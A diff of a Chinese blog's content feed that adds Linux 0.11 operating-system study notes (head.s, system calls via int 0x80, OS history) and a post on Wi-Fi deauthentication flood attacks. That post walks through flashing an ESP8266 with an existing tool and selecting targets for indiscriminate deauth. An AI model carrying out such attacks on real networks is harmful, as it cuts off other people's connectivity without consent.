+<p>system由许多文件编译而成，第一个就是head.s</p>
+<p><img src="s49.png"></p>
+<h3 id="head-s-一段在保护模式下运行的代码"><a href="#head-s-一段在保护模式下运行的代码" class="headerlink" title="head.s//一段在保护模式下运行的代码"></a>head.s//一段在保护模式下运行的代码</h3><ul>
+<li>setup是进入保护模式，head是进入之后的初始化</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">stratup_32:</span><br><span class="line">	movl $0x10,%eax</span><br><span class="line">	mov %ax,%ds</span><br><span class="line">	mov %ax,%es</span><br><span class="line">	</span><br><span class="line">	mov	%as,%fs</span><br><span class="line">	mov	%as,%gs</span><br><span class="line">	//指向gdt的0x10项(数据段)</span><br><span class="line">	</span><br><span class="line">	lss _start,%esp//设置栈(系统栈)</span><br><span class="line">	call setup_idt</span><br><span class="line">	call setup_gdt</span><br><span class="line">	//设置q和GDT</span><br><span class="line">	xorl %eax,%eax</span><br><span class="line">l:</span><br><span class="line">	incl %eax</span><br><span class="line">	movl %eax,0x000000</span><br><span class="line">	cmpl %eax,0x100000</span><br><span class="line">	je 1b	//0地址和1M地址处相同（A20没开启），就死循环</span><br><span class="line">	//检测A20开启否</span><br><span class="line">	jmp	after_page_tables//页表</span><br><span class="line">setup_idt:</span><br><span class="line">	lea ignore_int,%edx</span><br><span class="line">	movl $0x00080000,%eax</span><br><span class="line">	movw %dx,%ax</span><br><span class="line">	lea _idt,%edi</span><br><span class="line">	movl %eax,(%edi)</span><br></pre></td></tr></table></figure>
+
+<h3 id="关于汇编…head-s的汇编和之前不一样？"><a href="#关于汇编…head-s的汇编和之前不一样？" class="headerlink" title="关于汇编…head.s的汇编和之前不一样？"></a>关于汇编…head.s的汇编和之前不一样？</h3><ol>
+<li><p>as86汇编：能产生16位代码的Intel 8086汇编</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,cs	//cs-&gt;ax，目标操作数在前</span><br></pre></td></tr></table></figure></li>
+<li><p>GNU as汇编：产生32位代码，使用AT&amp;T语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl var,%eax	//（var）—&gt;%eax</span><br><span class="line">movb -4(%ebp),%al	//取出一字节</span><br></pre></td></tr></table></figure></li>
+<li><p>内敛汇编，gcc编译x.c会产生中间结果as汇编文件x.s</p>
+</li>
+</ol>
+<p><img src="s50.png"></p>
+<p><img src="s51.png"></p>
+<h3 id="after-page-tables-设置页表之后"><a href="#after-page-tables-设置页表之后" class="headerlink" title="after_page_tables    //设置页表之后"></a>after_page_tables    //设置页表之后</h3><ul>
+<li><p>setup是进入保护模式，head是进入之后的初始化</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">after_page_tables:</span><br><span class="line">	pushl $0</span><br><span class="line">	pushl $0</span><br><span class="line">	pushl $0</span><br><span class="line">	pushl $L6</span><br><span class="line">	//压栈</span><br><span class="line">	pushl $_main//将_main压入栈中</span><br><span class="line">	jmp set_paging</span><br><span class="line">L6:</span><br><span class="line">	jmp	L6//main返回时死循环，死机。</span><br><span class="line">setup_paging: 设置页表 ret</span><br></pre></td></tr></table></figure>
+
+<p>setup_paging执行ret后，会执行main.c。</p>
+<p>从汇编跳到执行C函数，和函数跳转一样。</p>
+</li>
+</ul>
+<p><img src="s52.png"></p>
+<p>三个参数分别为envp,argv,argc，此处都是0。</p>
+<p>此处的main只保留了传统的形式和命名。</p>
+<p>main的工作就是xx_init:内存、中断、设备、时钟、CPU等内容的初始化。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    mem_init();</span><br><span class="line">    trap_init();</span><br><span class="line">    blk_dev_init();</span><br><span class="line">    chr_dev_init();</span><br><span class="line">    tty_init();</span><br><span class="line">    time_init();</span><br><span class="line">    sched_init();</span><br><span class="line">    buffer_init();</span><br><span class="line">    hd_init();</span><br><span class="line">    floppy_init();</span><br><span class="line">    sti();</span><br><span class="line">    move_to_user_mode();</span><br><span class="line">    <span class="keyword">if</span>(!fork())&#123;init();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="看一看mem-init…可以在视图菜单中关闭"><a href="#看一看mem-init…可以在视图菜单中关闭" class="headerlink" title="看一看mem_init…可以在视图菜单中关闭"></a>看一看mem_init…可以在<code>视图</code>菜单中关闭</h3><p>执行内存的初始化。</p>
+<p><img src="s53.png"></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mem_init</span><span class="params">(<span class="keyword">long</span> start_mem,<span class="keyword">long</span> end_mem)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;PAGING_PAGS;i++)<span class="comment">//操作系统是使用着的</span></span><br><span class="line">        mem_map[i]=USED;</span><br><span class="line">    i=MAP_NR(start_mem);</span><br><span class="line">    end_mem-=start_mem;</span><br><span class="line">    end_mem&gt;&gt;=<span class="number">12</span>;	<span class="comment">//4k</span></span><br><span class="line">    <span class="keyword">while</span>(end_mem --&gt;<span class="number">0</span>)</span><br><span class="line">        mem_map[i++]=<span class="number">0</span>;<span class="comment">//每4k大小的区域放在一起置为0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="操作系统接口"><a href="#操作系统接口" class="headerlink" title="操作系统接口"></a>操作系统接口</h2><h3 id="接口（Interface）"><a href="#接口（Interface）" class="headerlink" title="接口（Interface）"></a>接口（Interface）</h3><ul>
+<li>连接两个东西、信号转换、屏蔽细节</li>
+</ul>
+<h4 id="什么是操作系统接口？"><a href="#什么是操作系统接口？" class="headerlink" title="什么是操作系统接口？"></a>什么是操作系统接口？</h4><p>连接上层用户和操作系统软件。</p>
+<h5 id="命令行？"><a href="#命令行？" class="headerlink" title="命令行？"></a>命令行？</h5><p>命令：一段程序，shell也是一段程序。</p>
+<p><img src="10.png"></p>
+<p><img src="11.png"></p>
+<p><img src="12.png"></p>
+<h5 id="图形按钮？"><a href="#图形按钮？" class="headerlink" title="图形按钮？"></a>图形按钮？</h5><ul>
+<li>鼠标点击、键盘按下后</li>
+</ul>
+<p><img src="13.png"></p>
+<p><img src="14.png"></p>
+<p><img src="15.png"></p>
+<h5 id="操作系统接口-1"><a href="#操作系统接口-1" class="headerlink" title="操作系统接口"></a>操作系统接口</h5><p>通过C语言程序，连接操作系统和应用软件。</p>
+<p>接口表现为函数调用，又由系统提供，所以称为系统调用。</p>
+<h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><ul>
+<li>POSIX：Portable Operating System Interface of Unix（IEEE制定的一个标准族）</li>
+</ul>
+<p><img src="16.png"></p>
+<h2 id="系统调用的实现"><a href="#系统调用的实现" class="headerlink" title="系统调用的实现"></a>系统调用的实现</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">main()&#123;whoami();&#125;</span><br><span class="line">whoami()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="number">100</span>,<span class="number">8</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">100</span>:<span class="string">&quot;lizhijun&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>应用程序为什么不能直接jmp到操作系统中执行函数？</p>
+<p>不允许，会有安全问题。</p>
+<h3 id="内核（用户）态，内核（用户）段"><a href="#内核（用户）态，内核（用户）段" class="headerlink" title="内核（用户）态，内核（用户）段"></a>内核（用户）态，内核（用户）段</h3><ul>
+<li><p>将内核程序和用户程序隔离</p>
+<ul>
+<li><p>区分内核态和用户态：通过一种处理器的硬件设计。</p>
+<img src="17.png"></li>
+<li><p><img src="18.png"></p>
+</li>
+<li><p>DPL用于描述目标内存段的特权级别（GDT中），CPL（当前的特权级，取决于执行的指令）</p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="硬件提供了“主动进入内核的唯一方法”"><a href="#硬件提供了“主动进入内核的唯一方法”" class="headerlink" title="硬件提供了“主动进入内核的唯一方法”"></a>硬件提供了“主动进入内核的唯一方法”</h3><ul>
+<li>int指令将使CS中的CPL改为0，“进入内核”</li>
+<li>这是用户程序发起调用内核代码的唯一方式</li>
+<li>系统调用的核心：<ol>
+<li>用户程序中包含一段包含int指令的代码</li>
+<li>操作系统写中断处理，获取想调程序的编号</li>
+<li>操作系统根据编号执行相应代码</li>
+</ol>
+</li>
+</ul>
+<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p><img src="19.png"></p>
+<ul>
+<li><p>最终展开成包含int指令的代码… </p>
+<p><img src="20.png"></p>
+</li>
+</ul>
+<h3 id="Write实现"><a href="#Write实现" class="headerlink" title="Write实现"></a>Write实现</h3><p><img src="21.png"></p>
+<p>先int 0x80，调用0x80号中断，再把_NR_write(4)赋给eax，eax又赋给了__res作为返回值。最后把a赋给ebx，把b赋给ecx,把c赋给edx。</p>
+<p>NR_write是系统调用号，放在eax中。</p>
+<p><img src="22.png"></p>
+<h3 id="int-0x80中断的处理"><a href="#int-0x80中断的处理" class="headerlink" title="int 0x80中断的处理"></a>int 0x80中断的处理</h3><p>通过IDT表来找到中断处理函数。</p>
+<ul>
+<li>显然，set_system_gate用来设置0x80的中断处理</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sched_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;	set_system_gate(<span class="number">0x80</span>,&amp;system_call)&#125;<span class="comment">//中断处理门</span></span><br><span class="line"><span class="comment">//遇到0x80中断，就跳到system_call的中断处理函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> set_system_gate(n,addr)	<span class="comment">//第n号中断对应处理函数入口点偏移地址addr</span></span></span><br><span class="line">_set_gate(&amp;idt[n],<span class="number">15</span>,<span class="number">3</span>,addr);<span class="comment">//idt是中断向量表基址</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _set_gate(gate_addr, type, dpl, addr)</span></span><br><span class="line">_asm_(</span><br><span class="line">    <span class="string">&quot;movw %%dx,%%ax\n\t&quot;</span> <span class="string">&quot;movw %0,%%dx\n\t&quot;</span></span><br><span class="line">    <span class="string">&quot;movl %%eax, %1\n\t&quot;</span> <span class="string">&quot;movl %%edx, %2&quot;</span>:</span><br><span class="line">     :<span class="string">&quot;i&quot;</span>((<span class="keyword">short</span>)(<span class="number">0x8000</span>+(dpl&lt;&lt;<span class="number">13</span>)+type&lt;&lt;<span class="number">8</span>))</span><br><span class="line">	),<span class="string">&quot;o&quot;</span>(*((<span class="keyword">char</span>*)(gate_addr))),</span><br><span class="line">	<span class="string">&quot;o&quot;</span>(*(<span class="number">4</span>+(<span class="keyword">char</span>*)(gate_addr))),</span><br><span class="line">	<span class="string">&quot;d&quot;</span>((<span class="keyword">char</span>*)(addr),<span class="string">&quot;a&quot;</span>(<span class="number">0x00080000</span>))</span><br></pre></td></tr></table></figure>
+
+<p><img src="23.png"></p>
+<p>段选择符0x8000,处理函数入口点偏移&amp;system_call。</p>
+<p>cs=8，ip=&amp;system_call</p>
+<p>cpl是cs最后两位，cpl=00</p>
+<h3 id="中断处理程序：system"><a href="#中断处理程序：system" class="headerlink" title="中断处理程序：system"></a>中断处理程序：system</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nr_system_call=72</span><br><span class="line">.globl _system_call</span><br><span class="line">_system_call:</span><br><span class="line">	cmpl $nr_system_call-1,%eax	</span><br><span class="line">	//eax存放的是系统调用号</span><br><span class="line">	//eax=nr_write,系统调用号</span><br><span class="line">	ja bad_sys_call</span><br><span class="line">	push %ds</span><br><span class="line">	push %es</span><br><span class="line">	push %fs</span><br><span class="line">	</span><br><span class="line">	pushl %edx</span><br><span class="line">	pushl %ecx</span><br><span class="line">	pushl %ebx</span><br><span class="line">	//调用的参数</span><br><span class="line">	movl $0x10,%edx</span><br><span class="line">	mov %dx,%ds</span><br><span class="line">	mov %dx,%es</span><br><span class="line">	//内核数据</span><br><span class="line">	movl $0x17,%edx</span><br><span class="line">	mov %dx,fs</span><br><span class="line">	//fs可以找到用户数据</span><br><span class="line">	call _sys_call_table(,%eax,4)</span><br><span class="line">	//_sys_call_table+4*eax就是相应系统调用处理函数入口</span><br><span class="line">	//这里乘4是因为这个表里每一项都是一个函数地址4个字节</span><br><span class="line">	pushl %eax</span><br><span class="line">	//返回值压栈，留着ret_from_sys_call时用</span><br><span class="line">	...</span><br><span class="line">ret_from_sys_call:</span><br><span class="line">	popl %eax,其他pop,iret</span><br></pre></td></tr></table></figure>
+
+<h3 id="sys-call-table"><a href="#sys-call-table" class="headerlink" title="_sys_call_table"></a>_sys_call_table</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fn_ptr_call_table[]=</span><br><span class="line">&#123;</span><br><span class="line">    sys_setup,sys_exit,sys_fork,sys_read,sys_write,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>call _sys_call_table(,%eax,4)依据上表就是call sys_write</p>
+<p><img src="24.png"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="25.png"></p>
+<h2 id="操作系统历史"><a href="#操作系统历史" class="headerlink" title="操作系统历史"></a>操作系统历史</h2><h3 id="操作系统的开端"><a href="#操作系统的开端" class="headerlink" title="操作系统的开端"></a>操作系统的开端</h3><ul>
+<li><p>（1955-1965）计算机非常昂贵，上古神机IBM7094,造价250万美元以上</p>
+<ul>
+<li>计算机使用原则：只专注于计算</li>
+<li>批处理操作系统（Batch syste）</li>
+<li>典型代表：<strong>IBSYS监控系统</strong></li>
+</ul>
+<p><img src="26.png"></p>
+</li>
+<li><p>计算机开始进入多个行业：科学计算（IBM 7094）,银行（IBM1401）</p>
+<ul>
+<li>需要一台计算机干多个事情</li>
+<li>多道程序：在计算机内存中同时存放几道相互独立的程序，使它们在管理程序控制下，相互穿插运行，两个或两个以上程序在计算机系统中同处于开始到结束之间的状态, 这些程序共享计算机系统资源。</li>
+<li>作业之间的切换和调度成为核心：因为既有IO认为，又有计算任务，需要让CPU忙碌，例如：读写磁盘时不让CPU闲置，执行下一任务，等读写结束，回到上一任务。<strong>多进程结构和进程管理萌芽。</strong></li>
+<li>典型代表：<strong>IBM OS/360</strong>（360待变全方位服务），开发周期5000个人年</li>
+</ul>
+</li>
+<li><p>计算机进入多个行业，使用人数增加</p>
+<ul>
+<li>如果每个人启动一个作业，作业之间快速切换</li>
+<li>分时系统：分时操作系统将系统<a href="https://baike.baidu.com/item/%E5%A4%84%E7%90%86%E6%9C%BA/128842">处理机</a>时间与内存空间按一定的时间间隔，轮流地切换给各终端用户的程序使用。由于时间间隔很短，每个用户的感觉就像他独占计算机一样。</li>
+<li>代表：MIT MULTICS</li>
+<li>核心仍然是任务切换，但是资源复用的思想对操作系统影响很大，虚拟内存就是一种复用。</li>
+</ul>
+</li>
+<li><p>小型计算机出现，PDP-1每台售价120000美元</p>
+<ul>
+<li>越来越多的人可以使用计算机</li>
+<li>1969年：贝尔实验室的Ken Thompson、Dennis Ritchi等在一台没人使用的PDP-7上开发了一个简化的MULTICS，就是后来的UNIX。</li>
+</ul>
+</li>
+<li><p>1981，IBM推出IBM PC。个人计算机开始普及</p>
+<ul>
+<li>很多人可以用计算机并接触UNIX</li>
+<li>1987年Andrew Tanenbaum发布了MINIX用于教学</li>
+<li>Linus Torvalds在386sx兼容微机上学习minix，做出了小Linux于1991年发布</li>
+<li>1994年，Linux1.0发布并采用GPL协议，1998年以后互联网世界开展了一场Linux产业化运动</li>
+</ul>
+</li>
+</ul>
+<h4 id="核心思想、技术："><a href="#核心思想、技术：" class="headerlink" title="核心思想、技术："></a>核心思想、技术：</h4><ol>
+<li>用户通过执行程序来使用计算机（与冯诺依曼的思想吻合）</li>
+<li>作为管理者，操作系统要让多个程序合理推进，就是<strong>进程管理</strong></li>
+<li>多进程（用户）推进时需要内存复用</li>
+<li>等等…</li>
+</ol>
+<p>多进程结构是操作系统基本图谱。</p>
+<h3 id="PC与DOS"><a href="#PC与DOS" class="headerlink" title="PC与DOS"></a>PC与DOS</h3><ul>
+<li>PC机的诞生一定会导致百花齐放。IBM推出PC，自然要给机器配一个操作系统<ul>
+<li>1975年Digital Research为Altair 8800开发了操作系统CP/M</li>
+<li>CP/M：写命令给用户用，执行命令对应的程序，单任务执行</li>
+<li>1980出现了8086 16位芯片，在CP/M基础上开发了QDOS</li>
+</ul>
+</li>
+<li>Bill Gates进入历史舞台<ul>
+<li>1975年与Paul Allen为Altair 8800开发了BASIC解释器，开创了微软</li>
+<li>1977年开发FAT管理磁盘</li>
+<li>QDOS的成功在于以CP/M为基础将BASIC和FAT包含了进来<ul>
+<li>文件管理和编程环境都是用户所关心的。</li>
+</ul>
+</li>
+<li>1981年微软买下了QDOS，改名为MS-DOS，与IBM PC打包出售</li>
+</ul>
+</li>
+</ul>
+<h4 id="从MS-DOS到Windows"><a href="#从MS-DOS到Windows" class="headerlink" title="从MS-DOS到Windows"></a>从MS-DOS到Windows</h4><ul>
+<li>MS-DOS的磁盘、文件、命令让用起来更方便，但可以更方便<ul>
+<li>1989，MS-DOS4.0出现，支持了鼠标和键盘</li>
+<li>Windows3.0大获成功</li>
+<li>之后出现了95，XP，Vista，Win 7。。。</li>
+<li>文件、开发环境、图形界面对于OS的重要性</li>
+</ul>
+</li>
+</ul>
+<h4 id="核心思想、技术：-1"><a href="#核心思想、技术：-1" class="headerlink" title="核心思想、技术："></a>核心思想、技术：</h4><ol>
+<li>仍然是程序执行、多进程、程序带动其他设备使用的基本结构</li>
+<li>开始重视用户的体验：各种文件、编程环境、图形界面</li>
+</ol>
 ]]></content>
       <categories>
-        <category>软件安全</category>
+        <category>操作系统</category>
       </categories>
   </entry>
   <entry>
@@ -885,586 +1163,55 @@
       </categories>
   </entry>
   <entry>
-    <title>基础知识</title>
-    <url>/2021/07/13/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<h2 id="什么是操作系统？"><a href="#什么是操作系统？" class="headerlink" title="什么是操作系统？"></a>什么是操作系统？</h2><p>只有计算机硬件的东西叫裸机。</p>
-<p>在计算机硬件和应用之间的一层软件就是操作系统。</p>
-<ul>
-<li>方便我们使用硬件</li>
-<li>高效的使用硬件</li>
-</ul>
-<p>操作系统管理这些硬件</p>
-<ul>
-<li><strong>CPU管理</strong></li>
-<li><strong>内存管理</strong></li>
-<li><strong>终端管理</strong></li>
-<li><strong>磁盘管理</strong></li>
-<li><strong>文件管理</strong></li>
-<li>网络管理</li>
-<li>电源管理</li>
-<li>多核管理</li>
-</ul>
-<span id="more"></span>
+    <title>无线DOS之取消验证洪水攻击</title>
+    <url>/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/</url>
+    <content><![CDATA[<h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
 
-<h3 id="学习操作系统可以有很多层次"><a href="#学习操作系统可以有很多层次" class="headerlink" title="学习操作系统可以有很多层次"></a>学习操作系统可以有很多层次</h3><ul>
-<li>从应用软件出发“探到操作系统”<ul>
-<li>集中在使用计算机的接口上</li>
-<li>使用显示器：printf；使用CPU：fork，使用文件：open、read……</li>
-</ul>
-</li>
-<li>从应用软件触发“进入操作系统”<ul>
-<li>一段文字是如何写到磁盘上的…</li>
-</ul>
-</li>
-<li>从硬件触发“设计并实现操作系统”<ul>
-<li>给一个板子，配一个操作系统</li>
-</ul>
-</li>
-</ul>
-<h2 id="揭开钢琴的盖子"><a href="#揭开钢琴的盖子" class="headerlink" title="揭开钢琴的盖子"></a>揭开钢琴的盖子</h2><h3 id="从图灵机到通用图灵机"><a href="#从图灵机到通用图灵机" class="headerlink" title="从图灵机到通用图灵机"></a>从图灵机到通用图灵机</h3><p><img src="1.png"></p>
-<p>图灵机只能做一件事，就像一个只会做一道菜的厨师。</p>
-<p><img src="2.png"></p>
-<p>通用图灵机可以进行编程了，就如同给厨师不同的菜谱可以做出不同的菜。</p>
-<h3 id="从通用图灵机到计算机"><a href="#从通用图灵机到计算机" class="headerlink" title="从通用图灵机到计算机"></a>从通用图灵机到计算机</h3><ul>
-<li>伟大想法的工程实现<ul>
-<li>冯诺依曼存储程序思想（1946年提出）</li>
-<li>主要思想：将程序和数据放在计算机内部的存储器中，计算机在程序控制下一步一步进行处理</li>
-<li>计算机由五大部件组成：输入设备、输出设备、存储器、运算器、控制器。</li>
-</ul>
-</li>
-</ul>
-<h3 id="打开电源，计算机执行的第一条指令是什么？"><a href="#打开电源，计算机执行的第一条指令是什么？" class="headerlink" title="打开电源，计算机执行的第一条指令是什么？"></a>打开电源，计算机执行的第一条指令是什么？</h3><ul>
-<li><p>计算模型=&gt;我们要关注指针IP及其指向的内容</p>
-<ul>
-<li>计算机刚打开电源时，IP=？</li>
-<li>由硬件设计者决定！</li>
-</ul>
-</li>
-<li><p>看x86 PC</p>
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
+<p>简单配置一下</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
+
+<p>烧录</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
+
+<p>这时，esp8266会建立一个WIFI，</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
+
+<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
+
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
+
+<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
+<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
+<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
 <ol>
-<li><p>x86刚开机时CPU处于实模式。</p>
-<p>实模式和保护模式对应，实模式的寻址CS:IP(CS左移4位+IP)，和保护模式不同。</p>
-</li>
-<li><p>开机时，CS=0xFFFF；IP=0x0000</p>
-</li>
-<li><p>寻址0xFFFF0(ROM BIOS映射区)</p>
-</li>
-<li><p>检查RAM，键盘，显示器，软硬磁盘，主板……</p>
-</li>
-<li><p>将磁盘0磁道0扇区（MBR）读入0x7c00处（一个扇区524字节）</p>
-</li>
-<li><p>设置CS=0x07c0,IP=0x0000</p>
-</li>
+<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
+<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
 </ol>
-</li>
-</ul>
-<h3 id="0x7c00处存放的代码"><a href="#0x7c00处存放的代码" class="headerlink" title="0x7c00处存放的代码"></a>0x7c00处存放的代码</h3><ul>
-<li>就是从磁盘引导扇区读入的那512字节<ul>
-<li>引导扇区就是启动设备的第一个扇区（开机时按住del健可进入启动设备设置界面，可以设置为光盘启动）</li>
-<li>启动设备信息被设置在CMOS中…（CMOS：互补金属氧化物半导体。用来存储时钟和硬件配置信息）</li>
-<li>因此，硬盘的第一个扇区上存放着开机后执行的第一段我们可以控制的程序</li>
-<li>操作系统的故事从这里开始</li>
-</ul>
-</li>
-</ul>
-<h3 id="引导扇区代码：bootsect-s"><a href="#引导扇区代码：bootsect-s" class="headerlink" title="引导扇区代码：bootsect.s"></a>引导扇区代码：bootsect.s</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.globl begtext,begdata,begbss,endtext,enddata,endbss</span><br><span class="line">.text	//文本段</span><br><span class="line">begtext:</span><br><span class="line">.data	//数据段</span><br><span class="line">begdata:</span><br><span class="line">.bss	//为初始化数据段</span><br><span class="line">begbss:</span><br><span class="line">entry start	//关键字entry告诉链接器“程序入口”</span><br><span class="line">start:</span><br><span class="line">	mov ax.#BOOTSEG</span><br><span class="line">	//0x07c0,启动代码所在位置放入ax</span><br><span class="line">	mov ds,ax</span><br><span class="line">	//将启动代码与ds寄存器关联</span><br><span class="line">	mov ax.#INITSEG</span><br><span class="line">	//启动代码要被复制到的目的地址</span><br><span class="line">	mov es,ax</span><br><span class="line">	//将目的地址与es寄存器关联</span><br><span class="line">	mov cx,#256</span><br><span class="line">	</span><br><span class="line">	sub si,si</span><br><span class="line">	sub di,di</span><br><span class="line">	//si清零,ds:si即0x07c00</span><br><span class="line">	//di清零,es:di即0x90000</span><br><span class="line">	rep</span><br><span class="line">	//循环移动cx（256）个字,512字节</span><br><span class="line">	//将0x07c0 : 0x0000处的256个字移到0x9000 : 0x0000处</span><br><span class="line">	movw</span><br><span class="line">	jmpi go,INITSEG	//CS=INITSEG	IP=go</span><br><span class="line">	//jmpi 段间跳转</span><br><span class="line">/*</span><br><span class="line">SETUPLEN = 4	nomber of setup-sectors</span><br><span class="line">BOOTSEG  = 0x07c0	original address of boot-sector</span><br><span class="line">INITSEG  = 0x9000	we move boot here - out of the way</span><br><span class="line">SETUPSEG = 0x9020	setup starts here</span><br><span class="line">SYSSEG   = 0x1000	system loaded at 0x10000 (65536).</span><br><span class="line">ENDSEG   = SYSSEG + SYSSIZE	where to stop loading</span><br><span class="line">*/</span><br><span class="line">//由于启动代码复制到了新位置，需要更改相应寄存器的值</span><br><span class="line">go:	mov ax,cs	</span><br><span class="line">	//cs=0x9000</span><br><span class="line">	mov ds,ax </span><br><span class="line">	mov	es,ax</span><br><span class="line">	mov ss,ax</span><br><span class="line">	//开始引入栈</span><br><span class="line">	mov sp,#0xff00</span><br><span class="line">	//为call做准备，栈空间为0x9ff00</span><br><span class="line">//开始加载setup块</span><br><span class="line">load_setup:	//载入setup模块</span><br><span class="line">	mov	dx,#0x0000</span><br><span class="line">	//设置驱动器和磁头(drive 0, head 0): 软盘 0 磁头 </span><br><span class="line">	mov cx,#0x0002</span><br><span class="line">	//设置扇区号和磁道(sector 2, track 0): 0 磁头、0 磁道、2 扇区</span><br><span class="line">	mov bx,#0x0200</span><br><span class="line">	//设置读入的内存地址：BOOTSEG+address = 512，偏移512字节</span><br><span class="line">	mov ax,#0x0200+SETUPLEN</span><br><span class="line">	//SETUPLEN是读入的扇区个数，Linux 0.11 设置的是 4</span><br><span class="line">	int 0x13	</span><br><span class="line">	//BIOS中断,将setup.s对应的程序加载至内存指定地址</span><br><span class="line">	jnc ok_load_setup</span><br><span class="line">	//cf标志寄存器为0就跳转至ok_load_setup块   </span><br><span class="line">	mov dx,#0x0000</span><br><span class="line">	mov ax,#0x0000</span><br><span class="line">	int 0x13</span><br><span class="line">	//复位,cf!=０则重新设置传入信息,进入中断 </span><br><span class="line">	j	load_setup	//重读</span><br></pre></td></tr></table></figure>
+<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
+<p>首先是扫描：</p>
+<p>​    AP模式扫描周围的AP。</p>
